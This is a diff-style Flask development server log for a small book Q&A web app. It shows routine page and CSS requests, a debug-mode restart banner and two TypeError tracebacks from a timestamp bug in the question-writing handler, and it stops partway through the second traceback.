+124.49.105.89 - - [21/Oct/2020 03:16:15] "[37mGET /detail?id=5f8d8ac147639fbc089365da HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:16] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:16] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:16] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:16] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:16] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:16] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:16] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:16] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:16] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:18] "[37mGET /checkpw?id=5f8d8ac147639fbc089365da&type=q HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:18] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:18] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:18] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:18] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:18] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:18] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:18] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:18] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:18] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:22] "[32mPOST /check_password?id=5f8d8ac147639fbc089365da&reply_id=&type=q HTTP/1.1[0m" 302 -
+124.49.105.89 - - [21/Oct/2020 03:16:22] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:22] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:22] "[37mGET /static/js/function.js HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:22] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:22] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:22] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:22] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:22] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:22] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:22] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:22] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:24] "[37mGET /write HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:24] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:24] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:24] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:24] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:24] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:24] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:24] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:24] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:24] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:43] "[32mPOST /write_question HTTP/1.1[0m" 302 -
+124.49.105.89 - - [21/Oct/2020 03:16:43] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:43] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:43] "[37mGET /static/js/function.js HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:43] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:43] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:43] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:43] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:43] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:43] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:43] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:16:43] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+ * Detected change in '/home/ubuntu/booksalon_flask/app.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 333-203-131
+ * Serving Flask app "app" (lazy loading)
+ * Environment: production
+   WARNING: This is a development server. Do not use it in a production deployment.
+   Use a production WSGI server instead.
+ * Debug mode: on
+ * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 333-203-131
+124.49.105.89 - - [21/Oct/2020 03:20:08] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:20:08] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:20:08] "[37mGET /static/js/function.js HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:20:09] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:20:09] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:20:09] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:20:09] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:20:09] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:20:09] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:20:09] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:20:09] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:20:12] "[37mGET /write HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:20:12] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:20:12] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:20:12] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:20:12] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:20:12] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:20:12] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:20:12] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:20:12] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:20:12] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+203.133.180.84 - - [21/Oct/2020 03:20:24] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:20:25] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:20:25] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:20:25] "[37mGET /static/js/function.js HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:20:25] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:20:25] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:20:25] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:20:25] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:20:25] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:20:25] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:20:25] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:20:25] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:20:26] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+124.49.105.89 - - [21/Oct/2020 03:20:27] "[37mGET /write HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:20:30] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:20:31] "[37mGET /write HTTP/1.1[0m" 200 -
+121.53.242.2 - - [21/Oct/2020 03:20:45] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:21:02] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:21:02] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:21:02] "[37mGET /static/js/function.js HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:21:02] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:21:02] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:21:02] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:21:02] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:21:02] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:21:02] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:21:02] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:21:02] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:21:04] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+124.49.105.89 - - [21/Oct/2020 03:21:06] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:21:07] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:21:07] "[37mGET /static/js/function.js HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:21:07] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:21:07] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:21:07] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:21:07] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:21:07] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:21:07] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:21:07] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:21:07] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:21:07] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+211.36.159.17 - - [21/Oct/2020 03:24:26] "[37mGET / HTTP/1.1[0m" 200 -
+211.36.159.17 - - [21/Oct/2020 03:24:26] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+211.36.159.17 - - [21/Oct/2020 03:24:26] "[37mGET /static/js/function.js HTTP/1.1[0m" 200 -
+211.36.159.17 - - [21/Oct/2020 03:24:27] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+211.36.159.17 - - [21/Oct/2020 03:24:27] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+211.36.159.17 - - [21/Oct/2020 03:24:27] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+211.36.159.17 - - [21/Oct/2020 03:24:27] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+211.36.159.17 - - [21/Oct/2020 03:24:27] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+211.36.159.17 - - [21/Oct/2020 03:24:27] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+211.36.159.17 - - [21/Oct/2020 03:24:27] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+211.36.159.17 - - [21/Oct/2020 03:24:27] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:27:53] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:27:53] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:27:53] "[37mGET /static/js/function.js HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:27:53] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:27:53] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:27:53] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:27:53] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:27:53] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:27:53] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:27:53] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:27:53] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:29:48] "[37mGET /detail?id=5f8fa81b152e147082793241 HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:29:48] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:29:48] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:29:48] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:29:48] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:29:48] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:29:48] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:29:48] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:29:48] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:29:48] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+162.142.125.51 - - [21/Oct/2020 03:30:06] "[37mGET / HTTP/1.1[0m" 200 -
+162.142.125.51 - - [21/Oct/2020 03:30:07] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:37:22] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:37:22] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:37:22] "[37mGET /static/js/function.js HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:37:22] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:37:22] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:37:22] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:37:22] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:37:22] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:37:22] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:37:22] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:37:22] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:37:24] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:37:24] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:37:24] "[37mGET /static/js/function.js HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:37:24] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:37:24] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:37:24] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:37:24] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:37:24] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:37:24] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:37:24] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:37:24] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:37:26] "[37mGET /detail?id=5f8fa81b152e147082793241 HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:37:26] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:37:26] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:37:26] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:37:26] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:37:26] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:37:26] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:37:26] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:37:26] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:37:26] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:37:29] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:37:29] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:37:29] "[37mGET /static/js/function.js HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:37:29] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:37:29] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:37:29] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:37:29] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:37:29] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:37:29] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:37:29] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:37:29] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+121.53.242.6 - - [21/Oct/2020 03:37:57] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:38:03] "[37mGET /write HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:38:03] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:38:03] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:38:03] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:38:03] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:38:03] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:38:03] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:38:03] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:38:03] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:38:03] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:38:44] "[35m[1mPOST /write_question HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 2464, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 2450, in wsgi_app
+    response = self.handle_exception(e)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1867, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 2447, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1952, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1821, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1950, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1936, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/ubuntu/booksalon_flask/app.py", line 44, in write_question
+    time = datetime.now().strftime('%Y/%m/%d %H:%M:%S') + timedelta(hours=9)
+TypeError: must be str, not datetime.timedelta
+124.49.105.89 - - [21/Oct/2020 03:38:45] "[37mGET /write_question?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:38:45] "[37mGET /write_question?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:38:45] "[37mGET /write_question?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:38:45] "[37mGET /write_question?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:38:45] "[37mGET /write_question?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:38:45] "[37mGET /write_question?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:38:50] "[37mGET /write HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:38:50] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:38:50] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:38:50] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:38:50] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:38:50] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:38:50] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:38:50] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:38:50] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:38:50] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:38:53] "[35m[1mPOST /write_question HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 2464, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 2450, in wsgi_app
+    response = self.handle_exception(e)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1867, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 2447, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1952, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1821, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
